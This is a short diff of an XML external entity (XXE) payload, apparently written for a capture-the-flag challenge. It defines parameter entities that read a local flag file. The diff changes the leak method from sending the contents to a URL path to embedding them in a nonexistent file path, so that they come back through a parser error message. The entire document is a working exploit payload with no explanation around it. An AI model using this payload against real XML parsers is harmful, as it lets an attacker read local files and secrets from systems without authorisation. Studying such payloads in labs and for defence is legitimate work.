@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///flag_c24ccdfc008851700f2249ad5a9ca9f0">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM "/?%file;">">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM "file://nonexistent/%file;">">
 %eval;
-%exfiltrate;
+%error;
